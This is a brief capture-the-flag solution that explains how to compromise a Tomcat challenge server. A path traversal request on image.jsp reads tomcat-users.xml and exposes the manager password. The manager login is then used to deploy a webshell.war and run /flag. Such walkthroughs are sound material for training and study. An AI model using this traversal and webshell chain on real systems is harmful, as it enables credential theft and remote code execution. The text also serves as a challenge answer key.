1. Get path of tomcat-users.xml from Dockerfile.

2. Get Password using this payload
    GET /image.jsp?file=../../../../../../../../usr/local/tomcat/conf/tomcat-users.xml

3. Go to Tomcat manager page using password above. (username is tomcat)
    http://{victim_url}/manager/html

4. Deploy the webshell.war and go to webshell page.
    http://{victim_url}/webshell

5. Run this command.
    /flag

